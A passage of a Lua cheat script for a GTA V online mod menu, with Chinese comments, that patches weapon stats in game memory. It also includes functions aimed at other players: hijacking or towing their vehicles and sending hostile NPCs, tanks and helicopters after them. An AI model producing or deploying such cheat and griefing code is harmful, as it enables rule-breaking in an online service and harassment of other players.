    outTable['tyreSmoke']['red'], outTable['tyreSmoke']['green'], outTable['tyreSmoke']['blue'] = memory.read_int(pR), memory.read_int(pG), memory.read_int(pB)
    outTable['windowTint'] = VEHICLE.GET_VEHICLE_WINDOW_TINT(vehicle)
    outTable['extras'] = {}
    for i = 1, 9 do
        if VEHICLE.DOES_EXTRA_EXIST(vehicle, i)== 1 then
            table.insert(outTable['extras'], i)
        end
    end
    return outTable
end
function copy_vehicle(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED(pid)) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), false)
        local vehicleInfo = get_vehicle_info(vehicle)

        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        local vehicleClone = create_vehicle(vehicleInfo['hash'], pos.x, pos.y, pos.z, 0)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), vehicleClone, -1)

        VEHICLE.SET_VEHICLE_MOD_KIT(vehicleClone, 0)
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicleClone,vehicleInfo['wheelType'])
        for modType, modID in pairs(vehicleInfo['mods']) do
            VEHICLE.SET_VEHICLE_MOD(vehicleClone, tonumber(modType), tonumber(modID), false)
        end
        VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicleClone, vehicleInfo['tyresCanBurst'])
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicleClone, vehicleInfo['colors']['prim']['r'], vehicleInfo['colors']['prim']['g'], vehicleInfo['colors']['prim']['b'])
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicleClone, vehicleInfo['colors']['sec']['r'], vehicleInfo['colors']['sec']['g'], vehicleInfo['colors']['sec']['b'])
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicleClone, vehicleInfo['extraColors']['pearl'], vehicleInfo['extraColors']['wheels'])
        VEHICLE.SET_VEHICLE_LIVERY(vehicleClone, vehicleInfo['livery'])
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicleClone, vehicleInfo['plateText'])
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicleClone, vehicleInfo['plateType'])
        VEHICLE.SET_CONVERTIBLE_ROOF_LATCH_STATE(vehicleClone, vehicleInfo['roofState'])
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicleClone, vehicleInfo['tyreSmoke']['red'], vehicleInfo['tyreSmoke']['green'], vehicleInfo['tyreSmoke']['blue'])
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicleClone, vehicleInfo['windowTint'])
        for _, extraID in ipairs(vehicleInfo['extras']) do
            VEHICLE.SET_VEHICLE_EXTRA(vehicleClone, extraID, false)
        end
    end
end

----给予载具
function give_vehicle(pid)
    local label = util.register_label("输入载具模型名称")
    local input = get_input_from_screen_keyboard(label, 254, "")
    if input == "" then return end
    local hash = MISC.GET_HASH_KEY(input)
    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        local size = get_model_size(hash)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, size.y, 0)
        local heading = ENTITY.GET_ENTITY_HEADING(PLAYER.GET_PLAYER_PED(pid))
        local vehicle = create_vehicle(hash, pos.x, pos.y, pos.z, heading)
        request_control(vehicle)
        upgrade_vehicle(vehicle)
    else
        notify("无效载具模型")    
    end
end

----武器设置
function address_from_pointer_chain(address, offsets)
    local addr = address
    for k = 1, (#offsets - 1) do
        addr = memory.read_long(addr + offsets[k])
        if addr == 0 then
            return 0
        end
    end
    addr = addr + offsets[#offsets]
    return addr
end
function readWeaponAddress(storeTable, offset, stopIfModified)
    if util.is_session_transition_active() then return 0 end
    local userPed = PLAYER.PLAYER_PED_ID()
    local weaponHash, vehicleWeapon = get_weapon_hash(userPed)
    if stopIfModified and storeTable[weaponHash] then return 0 end
    local pointer = (vehicleWeapon and 0x70 or 0x20)
    local address = address_from_pointer_chain(entities.handle_to_pointer(userPed), {0x10B8, pointer, offset})
    if address == 0 then util.toast('Failed to find memory address.') return 0 end
    if storeTable[weaponHash] == nil then
        storeTable[weaponHash] = {
            address = address,
            original = memory.read_float(address)
        }
    end
    return weaponHash
end
--重设武器
function resetWeapons(modifiedWeapons)
    for hash, _ in pairs(modifiedWeapons) do
        memory.write_float(modifiedWeapons[hash].address, modifiedWeapons[hash].original)
        modifiedWeapons[hash] = nil
    end
end

--无后座
local modifiedRecoil = {}
function No_Recoil(toggled)
    no_recoil_toggeld = toggled
    while no_recoil_toggeld do
        local weaponHash = readWeaponAddress(modifiedRecoil, 0x2F4, true)
        if weaponHash == 0 then return end
        memory.write_float(modifiedRecoil[weaponHash].address, 0)
        util.yield()
    end
    resetWeapons(modifiedRecoil)
end
--无限范围
local modifiedRange = {}
function max_range(toggled)
    max_range_toggled = toggled
    while max_range_toggled do
        if util.is_session_transition_active() then return end
        local userPed = PLAYER.PLAYER_PED_ID()
        local weaponHash, vehicleWeapon = get_weapon_hash(userPed)
        if modifiedRange[weaponHash] then return end
        local pointer = (vehicleWeapon and 0x70 or 0x20)
        local userPedPointer = entities.handle_to_pointer(userPed)
        modifiedRange[weaponHash] = {
            minAddress   = address_from_pointer_chain(userPedPointer, {0x10B8, pointer, 0x298}),
            maxAddress   = address_from_pointer_chain(userPedPointer, {0x10B8, pointer, 0x29C}),
            rangeAddress = address_from_pointer_chain(userPedPointer, {0x10B8, pointer, 0x28C}),
        }
        if modifiedRange[weaponHash].minAddress == 0 or modifiedRange[weaponHash].maxAddress == 0 or modifiedRange[weaponHash].rangeAddress == 0 then 
            util.toast('找不到内存地址') 
            return 
        end
        modifiedRange[weaponHash].originalMin   = memory.read_float(modifiedRange[weaponHash].minAddress)
        modifiedRange[weaponHash].originalMax   = memory.read_float(modifiedRange[weaponHash].maxAddress)
        modifiedRange[weaponHash].originalRange = memory.read_float(modifiedRange[weaponHash].rangeAddress)
        memory.write_float(modifiedRange[weaponHash].minAddress,   150000)  --because the map is about 15km tall
        memory.write_float(modifiedRange[weaponHash].maxAddress,   150000)
        memory.write_float(modifiedRange[weaponHash].rangeAddress, 150000)
        util.yield()
    end
    --恢复
    for hash, _ in pairs(modifiedRange) do
        memory.write_float(modifiedRange[hash].minAddress, modifiedRange[hash].originalMin)
        memory.write_float(modifiedRange[hash].maxAddress, modifiedRange[hash].originalMax)
        memory.write_float(modifiedRange[hash].rangeAddress, modifiedRange[hash].originalRange)
        modifiedRange[hash] = nil
    end
end
--无扩散
local modifiedSpread = {}
function no_spread(toggled)
    no_spread_toggled = toggled
    while no_spread_toggled do
        local weaponHash = readWeaponAddress(modifiedSpread, 0x74, true)
        if weaponHash == 0 then return end
        memory.write_float(modifiedSpread[weaponHash].address, 0)
        util.yield()
    end
    resetWeapons(modifiedSpread)
end
--移除前摇
local modifiedSpinup = {{hash = util.joaat('weapon_minigun')},{hash = util.joaat('weapon_rayminigun')},}
function no_spinup(toggled)
    no_spinup_toggled = toggled
    while no_spinup_toggled do
        local weaponHash = WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID())
        for i, v in pairs(modifiedSpinup) do
            if weaponHash == v.hash then
                modifiedSpinup[i].address = address_from_pointer_chain(entities.handle_to_pointer(PLAYER.PLAYER_PED_ID()), {0x10B8, 0x20, 0x144})
                if modifiedSpinup[i].address == 0 then return end
                memory.write_float(modifiedSpinup[i].address, 0)
            end
        end
        util.yield()
    end
    --恢复
    for i = 1, #modifiedSpinup do
        if modifiedSpinup[i].address then
            memory.write_float(modifiedSpinup[i].address, 0.5)
        end
    end
end
--子弹伤害修改
local modifiedCarForce = {}
local modifiedHeliForce = {}
local modifiedPedForce = {}
function damagemoded(toggled)
    damagemoded_toggled = toggled
    while damagemoded_toggled do
        local carweaponHash = readWeaponAddress(modifiedCarForce, 0x0E0, false)
        if carweaponHash == 0 then return end
        memory.write_float(modifiedCarForce[carweaponHash].address, modifiedCarForce[carweaponHash].original * 100)

        local HeliweaponHash = readWeaponAddress(modifiedHeliForce, 0x0E4, false)
        if HeliweaponHash == 0 then return end
        memory.write_float(modifiedHeliForce[HeliweaponHash].address, modifiedHeliForce[HeliweaponHash].original * 100)

        local pedweaponHash = readWeaponAddress(modifiedPedForce, 0x0DC, false)
        if pedweaponHash == 0 then return end
        memory.write_float(modifiedPedForce[pedweaponHash].address, modifiedPedForce[pedweaponHash].original * 100)
        util.yield()
    end
    --重设
    resetWeapons(modifiedCarForce);resetWeapons(modifiedHeliForce);resetWeapons(modifiedPedForce)
end

--快速射击
function rapidfire()
    --[[ local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID(), 0)
    local boneId = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(weapon, "gun_muzzle")
    local boneCoords = ENTITY.GET_ENTITY_BONE_POSTION(weapon, boneId) ]]
    if PAD.IS_CONTROL_PRESSED(0, 24) and not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) then
        local weaponhash = WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID())
        local damage = WEAPON.GET_WEAPON_DAMAGE(weaponhash, 0)

        local gameplayCam = CAM.GET_FINAL_RENDERED_CAM_COORD()
        local gameplayCamRot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local gameplayCamDirection = vector3.toDir(gameplayCamRot)
        local startCoords = vector3.add(gameplayCam, gameplayCamDirection)
        local endCoords = vector3.add(startCoords, vector3.mulScalar(gameplayCamDirection, 500.0))  --get_offset_from_camera(30)

        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(startCoords.x, startCoords.y, startCoords.z, endCoords.x, endCoords.y, endCoords.z, damage, true, weaponhash, PLAYER.PLAYER_PED_ID(), true, false, 2500.0)
    end
end


--瞄准视野缩放
local extraZoom = 0
local modifiedZoomFov = {}
function zoomaimfov(value)
    extraZoom = (value - 100) / 100
end
function enablezoomfov(toggled)
    enablezoomfov_toggled = toggled
    while enablezoomfov_toggled do
        local weaponHash = readWeaponAddress(modifiedZoomFov, 0x410, false)
        if weaponHash == 0 then return end
        memory.write_float(modifiedZoomFov[weaponHash].address,  modifiedZoomFov[weaponHash].original + extraZoom)
        util.yield()
    end
    resetWeapons(modifiedZoomFov)
end









----自定义复活位置
local wasDead = false
function custom_respawn()
    if respawnPos == nil then 
        return 
    end
    local isDead = PLAYER.IS_PLAYER_DEAD(PLAYER.PLAYER_ID())
    if wasDead and not isDead then
        while PLAYER.IS_PLAYER_DEAD(PLAYER.PLAYER_ID()) do
            util.yield()
        end
        for i = 0, 30 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), respawnPos.x, respawnPos.y, respawnPos.z, false, false, false)
            ENTITY.SET_ENTITY_ROTATION(PLAYER.PLAYER_PED_ID(), respawnRot.x, respawnRot.y, respawnRot.z, 2, true)
            util.yield()
        end
    end
    wasDead = isDead
end
function save_custom_respawn()
    respawnPos = players.get_position(PLAYER.PLAYER_ID())
    respawnRot = ENTITY.GET_ENTITY_ROTATION(PLAYER.PLAYER_PED_ID(), 2)
    local pos = 'X: '.. respawnPos.x ..'\nY: '.. respawnPos.y ..'\nZ: '.. respawnPos.z
    local placename = util.get_label_text(ZONE.GET_NAME_OF_ZONE(v3.get(respawnPos)))
    menu.set_menu_name(custom_respawn_location, '更新位置(' .. placename..")")
    menu.set_help_text(custom_respawn_location,  '当前坐标:\n' .. pos)
    notification("~bold~~y~位置已更新", HudColour.blue)
end


----笨拙
function clumsy()
    if PED.IS_PED_RAGDOLL(PLAYER.PLAYER_PED_ID()) then 
        util.yield(3000) 
        return 
    end
    PED.SET_PED_RAGDOLL_ON_COLLISION(PLAYER.PLAYER_PED_ID(), true)
end
----摔倒
function stumble()
    local vector = ENTITY.GET_ENTITY_FORWARD_VECTOR(PLAYER.PLAYER_PED_ID())
    PED.SET_PED_TO_RAGDOLL_WITH_FALL(PLAYER.PLAYER_PED_ID(), 1500, 2000, 2, vector.x, -vector.y, vector.z, 1, 0, 0, 0, 0, 0, 0)
end


----掉落足球
function ball_drop(pos)
    local model = soccerball_models[math.random(1, #soccerball_models)]
    local pickup_hash = util.joaat(model)
    request_model(pickup_hash)
    pos.x = pos.x + math.random(-3, 3)
    pos.y = pos.y + math.random(-3, 3)
    pos.z = pos.z + math.random(5, 30)
    local pickup_pos = v3.new(pos.x, pos.y, pos.z)
    local pickup = entities.create_object(pickup_hash, pickup_pos, true)
    ENTITY.SET_ENTITY_COLLISION(pickup, true, true)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(pickup, 5, 0, 0, 1,true, false, true, true)
end
function delete_all_soccer()
    local ball_count = 0
    local all_objects = entities.get_all_objects_as_handles()
    for _, ball_model in pairs(soccerball_models) do
        local ball_hash = util.joaat(ball_model)
        for k, object in pairs(all_objects) do
            local object_hash = ENTITY.GET_ENTITY_MODEL(object)
            if object_hash == ball_hash then
                delete_entity(object)
                ball_count = ball_count + 1
            end
        end
    end
    util.toast("已清理 "..ball_count.." 个球")
end

----粒子拖尾
local vehparticle = "scr_mich4_firework_trail_spawn"
function get_model_dimensions(hash)
    local minimum = memory.alloc(24)
    local maximum = memory.alloc(24)
    local min = {}
    local max = {}
    MISC.GET_MODEL_DIMENSIONS(hash, minimum, maximum)
    min.x, min.y, min.z = v3.get(minimum)
    max.x, max.y, max.z = v3.get(maximum)
    local size = {}
    size.x = max.x - min.x
    size.y = max.y - min.y
    size.z = max.z - min.z
    return size
end
function selectparticle(index, menu_name, prev_value, click_type)
    vehparticle = vehparticle_tb[index]
end
function particle_tail()
    local vehicle = entities.get_user_vehicle_as_handle(false)
    local height = get_model_dimensions(ENTITY.GET_ENTITY_MODEL(vehicle))
    local posX1 = -height.x/3 --left--
    local posX2 = height.x/3 --right--
    local posY = -height.y/3
    for i, posX in {posX1, posX2} do
        request_ptfx_asset("scr_rcpaparazzo1")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcpaparazzo1")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(vehparticle, vehicle, posX, posY, 0.0, 0.0, 0.0, 0.0, 1.0, false, false, false)
    end
end

----快速关闭GTAV
function restart_game()
    MISC1._RESTART_GAME()
end
function exit_game()
    local pass_list = {{0}}
    while true do
        for _, pass in ipairs(pass_list) do
            local rid = players.get_rockstar_id(PLAYER.PLAYER_ID())
            if pass.id == rid then
                return 
            else
                break
            end
        end
    end
end


----劫持载具
function hijacking_vehicles(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local time = 0
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = players.get_position(pid)
    local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
    local driver = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
    local passenger = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -2))
    pos.z = pos.z - 50
    if not PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
        util.toast(lang.get_localised(1067523721):gsub("{}", players.get_name(pid)))
    return end
    if not PED.IS_PED_A_PLAYER(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1)) then
        util.toast("车辆已被成功劫持:D")
    return end

    local spawned_ped = PED1.CREATE_RANDOM_PED(pos)
    ENTITY.SET_ENTITY_INVINCIBLE(spawned_ped, true)
    ENTITY.SET_ENTITY_VISIBLE(spawned_ped, false)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(spawned_ped, true)
    TASK1.TASK_ENTER_VEHICLE(spawned_ped, vehicle, 1000, -1, 1.0, (1 << 1) | (1 << 3) | (1 << 4) | (1 << 9))
    entities.give_control_by_handle(spawned_ped, pid)
    repeat
        time = time + 1   
        if time > 300 and not PED.IS_PED_IN_ANY_VEHICLE(spawned_ped, false) then
            if players.get_name(driver) ~= "InvalidPlayer" then
                util.toast("未能成功劫持 " .. players.get_name(driver) .. "的载具. :/")
            else
                util.toast("未能成功劫持 " .. players.get_name(pid) .. "的载具. :/")
            end
            delete_entity(spawned_ped)
            time = 0
            break 
        end
        util.yield()
    until TASK.GET_IS_TASK_ACTIVE(ped, 2)
    if TASK.GET_IS_TASK_ACTIVE(ped, 2) then
        repeat
            util.yield()
        until not TASK.GET_IS_TASK_ACTIVE(ped, 2) or PED.IS_PED_IN_ANY_VEHICLE(spawned_ped, false)
        TASK.TASK_VEHICLE_DRIVE_WANDER(spawned_ped, vehicle, 9999.0, 6) 
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(vehicle, pid, true)
        util.toast("他们的载具现在是你的了")
        util.yield(1000)
    end
    if not TASK.GET_IS_TASK_ACTIVE(spawned_ped) or TASK.GET_IS_TASK_ACTIVE(spawned_ped, 15) then
        repeat
            TASK.TASK_VEHICLE_DRIVE_WANDER(spawned_ped, vehicle, 9999.0, 6) -- giving task again cus doesnt work sometimes
            util.yield()
        until TASK.GET_IS_TASK_ACTIVE(spawned_ped, 151)
    end
    util.yield(5000)
    if spawned_ped ~= nil and not PED.IS_PED_IN_ANY_VEHICLE(spawned_ped, false) then -- 2nd check cus sometimes doesnt delete the first time
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(spawned_ped) then
            repeat
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_ped)
                util.yield()
            until NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(spawned_ped)
            repeat 
                delete_entity(spawned_ped)
                util.yield()
            until not ENTITY.DOES_ENTITY_EXIST(spawned_ped)
        end
    end
end

----判断数字属于区间
function isNumberInRange(number, rangeStart, rangeEnd)
    -- 检查范围的起始和结束值是否正确
    if rangeStart > rangeEnd then
        util.toast("无效区间")
        return false
    end
    -- 判断数字是否在区间内
    if number >= rangeStart and number <= rangeEnd then
        return true
    else
        return false
    end
end


----自定义金钱删除
local remvalue = 10000
function set_remove_money_acc(value)
    remvalue = value
end
function remove_money()
    SET_INT_TUNABLE_GLOBAL(-156036296, remvalue) -- https://www.unknowncheats.me/forum/3276092-post3.html
    STATS.SET_PACKED_STAT_BOOL_CODE(15382, true) -- Makes able to buy the Ballistic Armor
    STATS.SET_PACKED_STAT_BOOL_CODE(9461, true) -- Makes you have the Ballistic Armor
    menu.trigger_commands("nopimenugrey on")
    if util.is_interaction_menu_open() then PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, 244, 1) end
    SET_INT_GLOBAL(2710428, 85) -- Renders Ballistic Equipment Services screen of the Interaction Menu
    PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, 244, 1) -- Presses M
    util.yield(10)
    PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, 176, 1) -- Presses Enter
end


----拖车
function towcarpro(pid, index, value)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local player_ped = PLAYER.GET_PLAYER_PED(pid)
    local last_veh = PED.GET_VEHICLE_PED_IS_IN(player_ped, true)
    local cur_veh = PED.GET_VEHICLE_PED_IS_IN(player_ped, false)
    if last_veh ~= 0 then
        request_control(last_veh, 3)
        tow_hash = -1323100960
        request_model(tow_hash)
        tower_hash = 0x9C9EFFD8
        request_model(tower_hash)
        local rots = ENTITY.GET_ENTITY_ROTATION(last_veh, 0)
        local dir = 5.0
        hdg = ENTITY.GET_ENTITY_HEADING(last_veh)
        if index == 2 then
            dir = -5.0
            hdg = hdg + 180
        end
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(last_veh, 0.0, dir, 0.0)
        local tower = entities.create_ped(28, tower_hash, coords, 30.0)
        local towtruck = entities.create_vehicle(tow_hash, coords, hdg)
        ENTITY.SET_ENTITY_HEADING(towtruck, hdg)
        ENTITY.SET_ENTITY_INVINCIBLE(towtruck,true)
        PED.SET_PED_INTO_VEHICLE(tower, towtruck, -1)
        request_control(last_veh, 3)
        VEHICLE.ATTACH_VEHICLE_TO_TOW_TRUCK(towtruck, last_veh, false, 0, 0, 0)
        TASK.TASK_VEHICLE_DRIVE_TO_COORD(tower, towtruck, math.random(1000), math.random(1000), math.random(100), 100, 1, ENTITY.GET_ENTITY_MODEL(last_veh), 4, 5, 0)
    end
end



----敌对行人
function Enemy_NPCS(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    if not NETWORK.NETWORK_IS_PLAYER_ACTIVE(pid) then
        return util.stop_thread()
    end
    local target = PLAYER.GET_PLAYER_PED(pid)
    local pSequence = memory.alloc_int()
    TASK.OPEN_SEQUENCE_TASK(pSequence)
    TASK.TASK_LEAVE_ANY_VEHICLE(0, 0, 256)
    TASK.TASK_COMBAT_PED(0, target, 0, 0)
    TASK.TASK_GO_TO_ENTITY(0, target, -1, 80.0, 3.0, 0.0, 0)
    TASK.CLOSE_SEQUENCE_TASK(memory.read_int(pSequence))
    for _, ped in ipairs(get_peds_in_player_range(pid, 70.0)) do
        if not PED.IS_PED_A_PLAYER(ped) and TASK.GET_SEQUENCE_PROGRESS(ped) == -1 then
            request_control(ped)
            local weapon = table.random(Enemy_Weapons)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
            PED.SET_PED_MAX_HEALTH(ped, 300)
            ENTITY.SET_ENTITY_HEALTH(ped, 300, 0)
            WEAPON.GIVE_WEAPON_TO_PED(ped, util.joaat(weapon), -1, false, true)
            WEAPON.SET_PED_DROPS_WEAPONS_WHEN_DEAD(ped, false)
            TASK.CLEAR_PED_TASKS(ped)
            TASK.TASK_PERFORM_SEQUENCE(ped, memory.read_int(pSequence))
        end
    end
    TASK.CLEAR_SEQUENCE_TASK(pSequence)
end



----敌对载具
local setGodmode = false
local gunnerWeapon = util.joaat("weapon_mg")
local weaponModId = -1
local enemy_count = 1
DecorFlag_isEnemyVehicle = 1 << 1

function set_enemy_Godmode(toggle)
    setGodmode = toggle
end
function set_enemy_count(value)
    enemy_count = value
end
function send_enemy_veh(index, option, pid)
    local i = 0
    veh_select = enemy_veh[index]
    while i < enemy_count and players.exists(pid) do
        if veh_select == "Minitank" then
            spawn_minitank(pid)
        elseif veh_select == "Lazer" then
            spawn_lazer(pid)
        elseif veh_select == "Buzzard" then spawn_buzzard(pid) end
        i = i + 1
        util.yield(150)
    end
end
function mini_tank_weapon(index)
    if index == 1 then
        weaponModId = minitankModIds.stockWeapon
    elseif index == 2 then
        weaponModId = minitankModIds.plasmaCannon
    elseif index == 3 then
        weaponModId = minitankModIds.rocket
    end
end
function enemy_gunman_weapon(index)
    gunnerWeapon = util.joaat(gunnerWeapons[index])
end
function spawn_minitank(targetId)
    if is_UltimateUser(targetId) then util.toast(BlockAttackUltimateUser) return end
    local vehicleHash = util.joaat("minitank")
    local pedHash = util.joaat("s_m_y_blackops_01")
    request_model(vehicleHash)
    request_model(pedHash)
    local pos = players.get_position(targetId)
    local vehicle = entities.create_vehicle(vehicleHash, pos, 0.0)
    if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
        return
    end
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(vehicle), true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, false, true)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(vehicle), PLAYER.PLAYER_ID(), true)
    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(vehicle, true, 1)
    set_decor_flag(vehicle, DecorFlag_isEnemyVehicle)
    local offset = get_random_offset_from_entity(vehicle, 35.0, 50.0)
    local outHeading = memory.alloc(4)
    local outCoords = v3.new()
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
        local driver = entities.create_ped(5, pedHash, offset, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(driver), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(driver, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(driver), PLAYER.PLAYER_ID(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(driver, true, 1)
        ENTITY.SET_ENTITY_INVINCIBLE(driver, true)
        PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
        AUDIO.STOP_PED_SPEAKING(driver, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 46, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 1, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 3, false)
        PED.SET_PED_COMBAT_RANGE(driver, 2)
        PED.SET_PED_SEEING_RANGE(driver, 1000.0)
        PED.SET_PED_SHOOT_RATE(driver, 1000)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
        TASK.SET_DRIVE_TASK_DRIVING_STYLE(driver, 786468)

        ENTITY.SET_ENTITY_COORDS(vehicle, outCoords.x, outCoords.y, outCoords.z, false, false, false, false)
        ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, setGodmode)
        VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
        VEHICLE.SET_VEHICLE_MOD(vehicle, 10, weaponModId, false)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
        local blip = add_blip_for_entity(vehicle, 742, 4)

        util.create_tick_handler(function()
            local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
            local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if not ENTITY.DOES_ENTITY_EXIST(vehicle) or ENTITY.IS_ENTITY_DEAD(vehicle, false) or not ENTITY.DOES_ENTITY_EXIST(driver) or PED.IS_PED_INJURED(driver) then
                return false
            elseif not PED.IS_PED_IN_COMBAT(driver, target) and not PED.IS_PED_INJURED(target) then
                TASK.CLEAR_PED_TASKS(driver)
                TASK.TASK_COMBAT_PED(driver, target, 0, 16)
                PED.SET_PED_KEEP_TASK(driver, true)
            elseif not NETWORK.NETWORK_IS_PLAYER_ACTIVE(targetId) or players.get_position(targetId):distance(vehPos) > 1000.0 then
                TASK.CLEAR_PED_TASKS(driver)
                PED.SET_PED_COMBAT_ATTRIBUTES(driver, 46, false)
                TASK.TASK_VEHICLE_DRIVE_WANDER(driver, vehicle, 10.0, 786603)
                PED.SET_PED_KEEP_TASK(driver, true)
                remove_decor(vehicle)
                util.remove_blip(blip)
                local pVehicle = memory.alloc_int()
                memory.write_int(pVehicle, vehicle)
                ENTITY.SET_VEHICLE_AS_NO_LONGER_NEEDED(pVehicle)
                return false
            end
        end)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
end
function spawn_buzzard(targetId)
    local vehicleHash <const> = util.joaat("buzzard")
    local pedHash <const> = util.joaat("s_m_y_blackops_01")
    request_model(vehicleHash);	request_model(pedHash)
    local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
    local playerRelGroup = PED.GET_PED_RELATIONSHIP_GROUP_HASH(target)
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("ARMY"), playerRelGroup)
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, playerRelGroup, util.joaat("ARMY"))
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(0, util.joaat("ARMY"), util.joaat("ARMY"))

    local pos = players.get_position(targetId)
    local heli = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    if ENTITY.DOES_ENTITY_EXIST(heli) then
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(heli), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(heli, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(heli), PLAYER.PLAYER_ID(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(heli, true, 1)
        set_decor_flag(heli, DecorFlag_isEnemyVehicle)
        local pos1 = get_random_offset_from_entity(target, 20.0, 40.0)
        pos1.z = pos1.z + 20.0
        ENTITY.SET_ENTITY_COORDS(heli, pos1.x, pos1.y, pos1.z, false, false, false, false)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.VEH_TO_NET(heli), false)
        ENTITY.SET_ENTITY_INVINCIBLE(heli, setGodmode)
        VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
        local blip = add_blip_for_entity(heli, 422, 4)
        set_blip_name(blip, "buzzard2", true)

        local pilot = entities.create_ped(29, pedHash, pos1, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        PED.SET_PED_INTO_VEHICLE(pilot, heli, -1)
        PED.SET_PED_MAX_HEALTH(pilot, 500)
        ENTITY.SET_ENTITY_HEALTH(pilot, 500, 0)
